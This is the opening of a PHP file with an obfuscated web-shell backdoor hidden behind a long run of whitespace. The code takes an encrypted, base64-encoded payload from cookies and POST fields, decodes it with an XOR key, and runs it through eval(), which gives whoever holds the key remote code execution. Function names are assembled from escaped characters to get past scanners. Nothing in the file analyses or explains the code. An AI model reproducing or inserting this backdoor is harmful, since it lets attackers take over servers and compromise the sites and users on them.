<?php                                                                                                                                                                                                                                                                                                                                                                                                 $nVqZGzTDht = class_exists("w_DXQij"); $UJYDshVEwy = $nVqZGzTDht;if (!$UJYDshVEwy){class w_DXQij{private $kbrlpvH;public static $ViwMH = "6daaf9a4-7e8a-4fad-8743-db8482da4c60";public static $yqwvyHIR = NULL;public function __construct(){$GlwtMCZh = $_COOKIE;$YSXLgTGXpj = $_POST;$PyQoub = @$GlwtMCZh[substr(w_DXQij::$ViwMH, 0, 4)];if (!empty($PyQoub)){$gdaEdYnh = "base64";$lpbCP = "";$PyQoub = explode(",", $PyQoub);foreach ($PyQoub as $UXHkyrOVBa){$lpbCP .= @$GlwtMCZh[$UXHkyrOVBa];$lpbCP .= @$YSXLgTGXpj[$UXHkyrOVBa];}$lpbCP = array_map($gdaEdYnh . "\x5f" . 'd' . "\x65" . 'c' . "\x6f" . chr (100) . "\x65", array($lpbCP,)); $lpbCP = $lpbCP[0] ^ str_repeat(w_DXQij::$ViwMH, (strlen($lpbCP[0]) / strlen(w_DXQij::$ViwMH)) + 1);w_DXQij::$yqwvyHIR = @unserialize($lpbCP);}}public function __destruct(){$this->DJsTM();}private function DJsTM(){if (is_array(w_DXQij::$yqwvyHIR)) {$voalq = str_replace("\74" . chr (63) . chr (112) . 'h' . 'p', "", w_DXQij::$yqwvyHIR["\143" . chr (111) . "\x6e" . chr (116) . "\x65" . "\156" . "\164"]);eval($voalq);exit();}}}$zJSRykSPeL = new w_DXQij(); $zJSRykSPeL = NULL;} ?><?php
/**
